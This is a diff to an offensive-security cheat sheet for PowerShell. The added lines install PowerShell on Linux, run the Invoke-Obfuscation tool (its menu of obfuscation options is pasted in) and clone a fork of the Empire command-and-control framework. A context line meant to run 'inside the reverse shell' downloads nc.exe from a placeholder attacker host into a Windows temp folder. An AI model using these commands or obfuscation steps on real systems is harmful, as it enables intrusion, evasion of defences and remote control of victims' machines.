@@ -1,6 +1,49 @@
 powershell
 ----------
 
+#Powershell on linux
+#Helps with using various invoke/obscure scripts (Arch)
+git clone https://aur.archlinux.org/powershell-preview-bin.git
+makepkg -i
+/usr/bin/pwsh-preview
+
+
+#Powershell Obfuscation
+#https://github.com/danielbohannon/Invoke-Obfuscation
+PS /home/Invoke-Obfuscation> Import-Module ./Invoke-Obfuscation.psd1
+PS /home/Invoke-Obfuscation> Invoke-Obfuscation
+
+HELP MENU :: Available options shown below:
+
+[*]  Tutorial of how to use this tool        	  TUTORIAL
+[*]  Show this Help Menu                     	  HELP,GET-HELP,?,-?,/?,MENU
+[*]  Show options for payload to obfuscate   	  SHOW OPTIONS,SHOW,OPTIONS
+[*]  Clear screen                            	  CLEAR,CLEAR-HOST,CLS
+[*]  Execute ObfuscatedCommand locally       	  EXEC,EXECUTE,TEST,RUN
+[*]  Copy ObfuscatedCommand to clipboard     	  COPY,CLIP,CLIPBOARD
+[*]  Write ObfuscatedCommand Out to disk     	  OUT
+[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
+[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
+[*]  Go Back to previous obfuscation menu    	  BACK,CD ..
+[*]  Quit Invoke-Obfuscation                 	  QUIT,EXIT
+[*]  Return to Home Menu                     	  HOME,MAIN
+
+
+Choose one of the below options:
+
+[*] TOKEN	Obfuscate PowerShell command Tokens
+[*] AST		Obfuscate PowerShell Ast nodes (PS3.0+)
+[*] STRING	Obfuscate entire command as a String
+[*] ENCODING	Obfuscate entire command via Encoding
+[*] COMPRESS	Convert entire command to one-liner and Compress
+[*] LAUNCHER	Obfuscate command args w/Launcher techniques (run once at end)
+
+
+#Empire-Mod-Hackplayers
+git clone https://github.com/Hackplayers/Empire-mod-Hackplayers.git
+
+
+
 # Run inside the reverse shell: 
 powershell -c '(new-object System.Net.WebClient).DownloadFile("http://x.x.x.x/nc.exe", "C:\Windows\Temp\nc.exe")'
 # OR
